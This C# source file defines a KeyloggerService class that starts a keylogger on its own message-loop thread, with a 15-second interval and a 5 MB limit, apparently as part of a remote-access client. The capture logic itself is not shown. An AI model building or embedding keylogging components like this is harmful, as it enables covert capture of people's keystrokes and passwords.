namespace Client.Logging
{
    public class KeyloggerService : IDisposable
    {
        private readonly Thread _msgLoopThread;
        private ApplicationContext _msgLoop;
        private Keylogger _keylogger;

        public KeyloggerService()
        {
            _msgLoopThread = new Thread(() =>
            {
                _msgLoop = new ApplicationContext();
                _keylogger = new Keylogger(15000, 5 * 1024 * 1024);
                _keylogger.Start();
                Application.Run(_msgLoop);
            });
        }

        public void Start()
        {
            _msgLoopThread.Start();
        }

        public void Dispose()
        {
            _keylogger.Dispose();
            _msgLoop.ExitThread();
            _msgLoop.Dispose();

            GC.SuppressFinalize(this);
        }
    }
}
